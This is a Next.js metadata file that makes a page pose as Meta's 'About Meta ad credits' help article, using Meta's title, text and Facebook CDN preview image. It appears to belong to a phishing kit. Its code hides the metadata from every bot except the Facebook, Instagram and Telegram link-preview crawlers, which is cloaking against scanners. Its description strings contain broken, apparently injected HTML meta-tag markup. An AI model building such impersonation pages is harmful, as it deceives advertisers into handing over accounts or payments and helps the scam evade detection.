import { headers } from 'next/headers';
import DeviceDetector from 'device-detector-js';

export async function generateMetadata() {
    const headersList = await headers();
    const userAgent = headersList.get('user-agent')?.toLowerCase() || '';
    const protocol = headersList.get('x-forwarded-proto') || 'https';
    const host = headersList.get('host') || 'localhost:3000';
    const metadataBase = new URL(`${protocol}://${host}`);

    const deviceDetector = new DeviceDetector();
    const device = deviceDetector.parse(userAgent);

    const isFacebookBot = userAgent.includes('facebookexternalhit') || userAgent.includes('facebot');
    const isInstagramBot = userAgent.includes('instagram');
    const isTelegramBot = userAgent.includes('telegrambot');

    const isAllowedBot = isFacebookBot || isInstagramBot || isTelegramBot;

    if (device.bot && !isAllowedBot) {
        return null;
    }

    return {
        metadataBase,
        title: 'About Meta ad credits | Meta Business Help Centre',
        icons: {
            icon: '/favicon.png',
            apple: '/favicon.png',
            shortcut: '/favicon.png',
        },
        description: 'A Meta ad credit is a form of payment for your Meta ads. It can be redeemed for advertising on Facebook and Instagram depending on the type of ad credit." /><meta property="og:description" content="A Meta ad credit is a form of payment for your Meta ads. It can be redeemed for advertising on Facebook and Instagram depending on the type of ad credit.',
        openGraph: {
            images: 'https://static.xx.fbcdn.net/rsrc.php/v1/y5/r/YIkC89ISLjN.jpg',
            title: 'About Meta ad credits | Meta Business Help Centre',
            description: 'A Meta ad credit is a form of payment for your Meta ads. It can be redeemed for advertising on Facebook and Instagram depending on the type of ad credit." /><meta property="og:description" content="A Meta ad credit is a form of payment for your Meta ads. It can be redeemed for advertising on Facebook and Instagram depending on the type of ad credit.',
        },
        twitter: {
            images: 'https://static.xx.fbcdn.net/rsrc.php/v1/y5/r/YIkC89ISLjN.jpg',
            title: 'About Meta ad credits | Meta Business Help Centre',
            description: 'A Meta ad credit is a form of payment for your Meta ads. It can be redeemed for advertising on Facebook and Instagram depending on the type of ad credit." /><meta property="og:description" content="A Meta ad credit is a form of payment for your Meta ads. It can be redeemed for advertising on Facebook and Instagram depending on the type of ad credit.',
        }
    };
}